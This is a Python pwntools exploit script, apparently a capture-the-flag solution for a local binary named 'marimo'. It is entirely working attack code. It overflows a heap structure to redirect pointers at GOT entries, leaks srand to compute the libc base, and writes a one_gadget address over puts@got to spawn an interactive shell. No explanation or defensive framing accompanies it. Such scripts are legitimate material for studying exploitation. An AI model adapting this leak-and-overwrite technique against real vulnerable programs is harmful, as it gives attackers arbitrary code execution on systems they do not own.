#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./marimo")
gdb.attach(p)
elf = ELF("./marimo")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_got = elf.got['puts']
strcmp_got = elf.got['strcmp']
srand_got = elf.got['srand']

def marimo():
    p.sendlineafter(">> ", "show me the marimo")
    p.sendlineafter(">> ", "AAAA")
    p.sendlineafter(">> ", "BBBB")

def view(num):
    p.sendlineafter(">> ", 'V')
    p.sendlineafter(">> ", str(num))

def modify(a):
    p.sendlineafter(">> ", 'M')
    p.sendlineafter(">> ", a)
    p.sendlineafter(">> ", 'B')

# malloc
marimo()
marimo()

# make profile size bigger
sleep(2)

# modify marimo2's name -> puts@got
view(0)
pay = p64(0)*5 + p64(0x21) + p32(0x5e3eca5b) + p32(1) + p64(srand_got) + p64(puts_got)
modify(pay)

# libc leak
view(1)
p.recvuntil("name : ")
srand = u64(p.recv(6) + "\x00\x00")
libcBase = srand - libc.symbols['srand']
one_gadget = libcBase + 0x45216
log.info("srand : "+hex(srand))
log.info("libcBase : "+hex(libcBase))


# marimo2's profile -> malloc_hook
p.sendlineafter(">> ", 'M')
p.sendafter(">> ", p64(one_gadget))

p.interactive()




